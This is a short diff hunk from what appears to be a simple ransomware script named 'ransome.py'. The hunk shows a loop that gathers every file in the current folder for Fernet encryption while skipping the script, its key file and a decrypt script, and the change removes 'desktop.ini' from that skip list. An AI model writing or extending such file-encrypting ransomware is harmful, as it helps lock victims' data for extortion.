@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 files=[]
 # Open all files in the current folder except this
 for file in os.listdir():
-    if file == "ransome.py" or file == "thekey.key" or file =="desktop.ini" or file=="decrypt.py":
+    if file == "ransome.py" or file == "thekey.key" or file=="decrypt.py":
         continue
 
     if os.path.isfile(file):
